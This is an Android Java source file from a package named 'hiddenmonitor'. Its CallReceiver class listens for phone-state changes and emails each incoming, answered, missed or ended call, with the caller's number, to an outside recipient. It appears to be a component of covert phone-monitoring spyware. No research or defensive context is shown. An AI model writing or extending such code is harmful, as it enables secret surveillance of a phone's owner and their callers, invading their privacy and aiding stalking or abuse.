package com.example.hiddenmonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

public class CallReceiver extends BroadcastReceiver {
    
    private static final String TAG = "CallReceiver";
    private EmailSender emailSender;
    private String lastState = "";
    private String savedNumber = "";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        emailSender = new EmailSender(context);
        
        if (intent.getAction().equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            
            if (incomingNumber != null) {
                savedNumber = incomingNumber;
            }
            
            if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                // Incoming call
                lastState = "RINGING";
                String subject = "📞 Incoming Call";
                String body = "Call from: " + savedNumber + "\n" +
                             "Status: Incoming\n" +
                             "Time: " + System.currentTimeMillis();
                emailSender.sendEmail(subject, body);
                
            } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                // Call answered
                if (lastState.equals("RINGING")) {
                    String subject = "📞 Call Answered";
                    String body = "Call from " + savedNumber + " was answered";
                    emailSender.sendEmail(subject, body);
                }
                lastState = "OFFHOOK";
                
            } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                // Call ended
                if (lastState.equals("RINGING")) {
                    String subject = "📞 Missed Call";
                    String body = "Missed call from " + savedNumber;
                    emailSender.sendEmail(subject, body);
                } else if (lastState.equals("OFFHOOK")) {
                    String subject = "📞 Call Ended";
                    String body = "Call with " + savedNumber + " ended";
                    emailSender.sendEmail(subject, body);
                }
                lastState = "IDLE";
            }
        }
    }
}
